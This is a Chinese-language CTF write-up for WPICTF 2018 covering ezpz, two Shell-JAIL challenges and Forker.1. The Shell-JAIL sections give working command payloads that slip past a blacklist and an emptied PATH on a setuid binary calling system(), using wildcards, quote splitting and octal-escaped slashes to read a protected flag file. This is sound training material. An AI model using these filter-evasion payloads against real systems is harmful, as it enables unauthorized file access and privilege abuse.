# WPICTF 2018 - Notes

## ezpz
直接丟到 ida pro 看程式碼可以知道

他一開始會要我們輸入一串密碼，然後和 "EZPZPASSWORD" 這個環境變數比對值

如果對的話，就呼叫 correct_pw() 這個函數來把 "EZPZPASSWORD" 的值印出來

而程式在一執行就會印出 correct_pw() 這個函數地址給我們，所以直接

overflow 後跳 correct_pw() 即可


## Shell-JAIL-1
> Description:
> 
> Download the login private key, then run:
> 
> ssh -p 31337 -i login shjail@shelljail1.wpictf.xyz
> 
> redundant servers on 31338 and 31339

題目給了一個 private key ，然後用此連上 server 


底下有三個檔案: access , access.c , flag.txt
```
28369edadf5f:/home/pc_owner$ ls -al
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10880 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1005 Apr 13 04:50 access.c
-r--r-----    1 pc_owner pc_owner        23 Apr 13 04:50 flag.txt
```

那可以看到 access 有 setuid，然後看一下 access.c 可以知道

他會把我們的輸入，餵給 system 來執行，只要裡面的指令不在黑名單即可

```
28369edadf5f:/home/pc_owner$ ./access cat "fl?g.t?t"
wpi{MaNY_WayS_T0_r3Ad}
===
28369edadf5f:/home/pc_owner$ ./access "cat fla'g'.'t'xt"
wpi{MaNY_WayS_T0_r3Ad}

```

## Shell-JAIL-2
> Description:
> 
> Download the login private key, then run:
> 
> ssh -p 31337 -i login shjail@shelljail2.wpictf.xyz


一樣有三個檔案
```
54cd9d6b47ef:/home/pc_owner$ ls -al
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10912 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1030 Apr 13 05:39 access.c
-r--r-----    1 pc_owner pc_owner        28 Apr 13 05:39 flag.txt
```

這題和第一題唯一的不同處在於其將 PATH 這個環境變數清空

所以直接用指令會不行，如
```
54cd9d6b47ef:/home/pc_owner$ ./access id
sh: id: not found
54cd9d6b47ef:/home/pc_owner$ ./access ls
sh: ls: not found
```

可以自己寫 code 驗證一下:
```
# a.c
#include <stdlib.h>
#include <stdio.h>

int main()
{
  setenv("PATH", "", 1);
  char *pathvar = getenv("PATH");
  printf("pathvar: %s\n", pathvar);
  return 0;
}
===
# gcc a.c -o a
# ./a
pathvar:

可以看到顯示為空，一般如果沒清空的話，大概會顯示如下:
pathvar: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

在沒有環境變數的情況下，如你要使用 cat ，需要下 /bin/cat

但我們還是可以使用 $, \, ' ，所以可以把 / 換成 $'\57'

57 是 ord('/') 的八進制，也是可以改成十六進制，也就是 $'\x2f' 是一樣的

這樣就可以用第一題的 payload 了
```
54cd9d6b47ef:/home/pc_owner$ ./access "$'\57'bin$'\57'cat $'\57'hom'e'$'\57'pc_ow'n'er$'\57'fla'g'.tx't'"
wpi{p0s1x_sh3Lls_ar3_w13rD}

```

另解:
```
54cd9d6b47ef:/home/pc_owner$ ./access pwd
/home/pc_owner
```
我們可以使用 . (source)
```
54cd9d6b47ef:/home/pc_owner$ ./access . "fla?.?xt"
sh: flag.txt: line 1: wpi{p0s1x_sh3Lls_ar3_w13rD}: not found
```

## Forker.1
> Description:
>
> nc forker1.wpictf.xyz 31337
> 
> redundant servers on 31338 and 31339
> 
> Hint: ASLR is disabled on the server

這題保護全部沒開，根據題目提示也知道沒有 aslr

丟到 ida pro 看一下程式碼，可以知道會在本地開 31337 port 

然後密碼是 INTERNET_FUNNY_MUNNY

整個簡單使用過程如下:

```
## Server Side
$ ./a 
## 開 server

===

## Client Side
$ nc localhost 31337 ## connect to server 
Please enter the correct password to get my secret ltc info
Password:INTERNET_FUNNY_MUNNY
You got the password right!
My litecoin address is LNpECGn9in6BGC8eaK87QawjzAXaWMht2b
```
